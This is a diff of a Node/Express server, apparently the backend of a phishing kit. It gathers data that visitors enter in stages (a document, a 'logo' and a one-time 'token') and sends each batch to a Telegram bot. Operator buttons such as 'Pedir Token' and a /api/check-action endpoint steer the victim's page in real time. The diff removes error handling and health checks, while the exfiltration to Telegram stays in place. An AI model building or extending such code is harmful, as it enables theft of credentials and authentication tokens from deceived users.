@@ -9,19 +9,6 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Validate environment variables
-const requiredEnvVars = ['TELEGRAM_BOT_TOKEN', 'TELEGRAM_CHAT_ID'];
-const missingEnvVars = requiredEnvVars.filter(varName => !process.env[varName]);
-
-if (missingEnvVars.length > 0) {
-    console.error('❌ ERROR: Missing required environment variables:', missingEnvVars.join(', '));
-    console.error('Please check your .env file or Railway environment variables.');
-    // In production, we'll continue but log warnings
-    if (process.env.NODE_ENV === 'production') {
-        console.warn('⚠️  WARNING: Running in production without proper Telegram configuration!');
-    }
-}
-
 // Middleware
 app.use(cors());
 app.use(bodyParser.json());
@@ -42,22 +29,13 @@ app.use((req, res, next) => {
     next();
 });
 
+// Static files
+app.use(express.static(path.join(__dirname, 'public')));
+
 // Serve root index.html as main page
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
-
-// Health check endpoint for Railway
-app.get('/health', (req, res) => {
-    res.status(200).json({ 
-        status: 'ok', 
-        uptime: process.uptime(),
-        timestamp: new Date().toISOString()
-    });
-});
-
-// Static files from public directory (for assets)
-app.use('/public', express.static(path.join(__dirname, 'public')));
 
 // Helpers
 const formatSessionData = (sessionData) => {
@@ -112,43 +90,34 @@ app.post('/api/process', (req, res) => {
 });
 
 app.post('/api/send-message', async (req, res) => {
-    try {
-        const { stage, data } = req.body;
+    const { stage, data } = req.body;
 
-        // Validate Telegram configuration
-        if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
-            console.error('Telegram not configured properly');
-            return res.status(500).json({ 
-                success: false, 
-                error: 'Telegram configuration missing' 
-            });
-        }
+    // Accumulate data in session
+    Object.assign(req.session, data);
 
-        // Accumulate data in session
-        Object.assign(req.session, data);
+    const message = formatSessionData(req.session);
+    const sessionId = req.sessionID;
 
-        const message = formatSessionData(req.session);
-        const sessionId = req.sessionID;
-
-        const buttons = {
-            inline_keyboard: [
-                [
-                    { text: '❌ Error Documento', callback_data: `error_documento:${sessionId}` },
-                    { text: '✅ Pedir Logo', callback_data: `pedir_logo:${sessionId}` }
-                ],
-                [
-                    { text: '❌ Error Logo', callback_data: `error_logo:${sessionId}` },
-                    { text: '🔑 Pedir Token', callback_data: `pedir_token:${sessionId}` }
-                ],
-                [
-                    { text: '❌ Error Token', callback_data: `error_token:${sessionId}` },
-                    { text: '🏁 Finalizar', callback_data: `finalizar:${sessionId}` }
-                ]
+    const buttons = {
+        inline_keyboard: [
+            [
+                { text: '❌ Error Documento', callback_data: `error_documento:${sessionId}` },
+                { text: '✅ Pedir Logo', callback_data: `pedir_logo:${sessionId}` }
+            ],
+            [
+                { text: '❌ Error Logo', callback_data: `error_logo:${sessionId}` },
+                { text: '🔑 Pedir Token', callback_data: `pedir_token:${sessionId}` }
+            ],
+            [
+                { text: '❌ Error Token', callback_data: `error_token:${sessionId}` },
+                { text: '🏁 Finalizar', callback_data: `finalizar:${sessionId}` }
             ]
-        };
+        ]
+    };
 
+    try {
         const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
-        const response = await fetch(url, {
+        await fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -159,90 +128,22 @@ app.post('/api/send-message', async (req, res) => {
             })
         });
 
-        const result = await response.json();
-        
-        if (!result.ok) {
-            console.error('Telegram API Error:', result);
-            return res.status(500).json({ 
-                success: false, 
-                error: 'Failed to send Telegram message' 
-            });
-        }
-
         req.session.save((err) => {
-            if (err) {
-                console.error('Session Save Error:', err);
-                return res.status(500).json({ 
-                    success: false, 
-                    error: 'Session save failed' 
-                });
-            }
+            if (err) console.error('Session Save Error:', err);
             res.json({ success: true });
         });
     } catch (error) {
-        console.error('Send Message Error:', error);
-        res.status(500).json({ 
-            success: false, 
-            error: 'Internal server error' 
-        });
+        console.error('Telegram Error:', error);
+        res.status(500).json({ success: false });
     }
 });
 
 // Polling and handling for Telegram
 let lastUpdateId = 0;
-let isPolling = false;
-let polling409Errors = 0;
-const MAX_409_ERRORS = 3;
-
-// Delete any existing webhook (conflicts with getUpdates)
-const deleteWebhook = async () => {
-    try {
-        const response = await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/deleteWebhook?drop_pending_updates=true`);
-        const data = await response.json();
-        if (data.ok) {
-            console.log('✅ Telegram webhook eliminado (listo para polling)');
-        }
-    } catch (error) {
-        console.warn('⚠️  No se pudo eliminar webhook:', error.message);
-    }
-};
 
 const pollTelegram = async () => {
-    // Prevent multiple polling instances
-    if (isPolling) return;
-    
-    // Don't start polling if credentials are missing
-    if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
-        console.warn('⚠️  Telegram polling skipped (missing credentials)');
-        return;
-    }
-    
-    // Stop polling if too many 409 errors
-    if (polling409Errors >= MAX_409_ERRORS) {
-        console.error('❌ Demasiados errores 409. DETENIENDO POLLING.');
-        console.error('   Causa: Otra instancia del bot está corriendo (probablemente en Railway)');
-        console.error('   Solución: Detén el servidor en Railway o cierra este servidor local');
-        return;
-    }
-    
-    isPolling = true;
-    
     try {
         const response = await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
-        
-        // Handle 409 Conflict (another instance is polling)
-        if (response.status === 409) {
-            polling409Errors++;
-            throw new Error(`CONFLICTO: Otra instancia del bot está haciendo polling (${polling409Errors}/${MAX_409_ERRORS})`);
-        }
-        
-        if (!response.ok) {
-            throw new Error(`Telegram API returned status ${response.status}`);
-        }
-        
-        // Reset 409 counter on success
-        polling409Errors = 0;
-        
         const data = await response.json();
 
         if (data.ok && data.result.length > 0) {
@@ -282,34 +183,10 @@ const pollTelegram = async () => {
             }
         }
     } catch (error) {
-        if (error.message.includes('CONFLICTO')) {
-            console.error(`❌ ${error.message}`);
-            if (polling409Errors >= MAX_409_ERRORS) {
-                console.error('');
-                console.error('╔════════════════════════════════════════════════════════════╗');
-                console.error('║  ⚠️  POLLING DETENIDO - ERROR 409 (Conflict)             ║');
-                console.error('║                                                            ║');
-                console.error('║  CAUSA: Hay múltiples instancias del bot en ejecución     ║');
-                console.error('║                                                            ║');
-                console.error('║  SOLUCIÓN:                                                 ║');
-                console.error('║  1. Si tienes el bot en Railway, detenlo allí             ║');
-                console.error('║  2. O cierra este servidor local                          ║');
-                console.error('║  3. Solo una instancia puede hacer polling a la vez       ║');
-                console.error('╚════════════════════════════════════════════════════════════╝');
-                console.error('');
-                return; // Don't schedule another poll
-            }
-        } else {
-            console.error('❌ Telegram Polling Error:', error.message);
-        }
-        // Don't spam logs on repeated errors
-    } finally {
-        isPolling = false;
+        console.error('Polling Error:', error);
     }
-    
-    // Continue polling with exponential backoff on errors
-    const delay = polling409Errors > 0 ? 10000 : (lastUpdateId === 0 ? 5000 : 1000);
-    setTimeout(pollTelegram, delay);
+    // Continue polling
+    setTimeout(pollTelegram, 1000);
 };
 
 // API Endpoints
@@ -326,75 +203,9 @@ app.get('/api/check-action', (req, res) => {
     res.json({ action: action || null });
 });
 
-// 404 Handler - Must be after all other routes
-app.use((req, res) => {
-    res.status(404).json({ 
-        success: false, 
-        error: 'Route not found',
-        path: req.path 
-    });
-});
-
-// Global Error Handler - Must be last
-app.use((err, req, res, next) => {
-    console.error('💥 Server Error:', err);
-    res.status(err.status || 500).json({
-        success: false,
-        error: process.env.NODE_ENV === 'production' 
-            ? 'Internal server error' 
-            : err.message
-    });
-});
-
 // Start Server
-const server = app.listen(PORT, async () => {
-    console.log(`✅ Server running on http://localhost:${PORT}`);
-    console.log(`📝 Environment: ${process.env.NODE_ENV || 'development'}`);
-    console.log(`🤖 Telegram Bot: ${process.env.TELEGRAM_BOT_TOKEN ? 'Configured' : 'NOT CONFIGURED'}`);
-    
+app.listen(PORT, () => {
+    console.log(`Server running on http://localhost:${PORT}`);
     // Start Telegram polling automatically
-    if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
-        await deleteWebhook(); // Clean any webhook before polling
-        pollTelegram();
-        console.log('🔄 Telegram polling started');
-    } else {
-        console.warn('⚠️  Telegram polling disabled (missing credentials)');
-    }
-});
-
-// Graceful shutdown
-const gracefulShutdown = (signal) => {
-    console.log(`\n${signal} received. Starting graceful shutdown...`);
-    server.close(() => {
-        console.log('✅ HTTP server closed');
-        process.exit(0);
-    });
-
-    // Force shutdown after 10 seconds
-    setTimeout(() => {
-        console.error('❌ Forcing shutdown after timeout');
-        process.exit(1);
-    }, 10000);
-};
-
-// Handle different termination signals
-process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
-process.on('SIGINT', () => gracefulShutdown('SIGINT'));
-
-// Handle uncaught exceptions
-process.on('uncaughtException', (error) => {
-    console.error('❌ Uncaught Exception:', error);
-    // In production, we log but don't crash immediately
-    if (process.env.NODE_ENV !== 'production') {
-        process.exit(1);
-    }
-});
-
-// Handle unhandled promise rejections
-process.on('unhandledRejection', (reason, promise) => {
-    console.error('❌ Unhandled Rejection at:', promise, 'reason:', reason);
-    // In production, we log but don't crash immediately
-    if (process.env.NODE_ENV !== 'production') {
-        process.exit(1);
-    }
+    pollTelegram();
 });
